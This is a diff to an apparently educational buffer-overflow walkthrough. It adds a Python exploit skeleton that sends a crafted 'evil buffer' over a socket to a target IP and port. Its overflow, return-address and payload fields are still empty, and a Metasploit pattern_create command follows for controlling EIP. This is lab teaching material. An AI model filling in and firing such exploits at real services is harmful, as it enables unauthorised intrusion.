@@ -55,6 +55,37 @@ The fuzzer will send increasingly long strings comprised of As. If the fuzzer cr
 
 ### Crash Replication & Controlling EIP
 
+Create exploit.py
+
+```
+#!/usr/bin/env python3
+
+import socket
+
+ip = "192.168.1.201" # CHANGE THIS
+port = 1337 # CHANGE THIS
+
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+
 Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
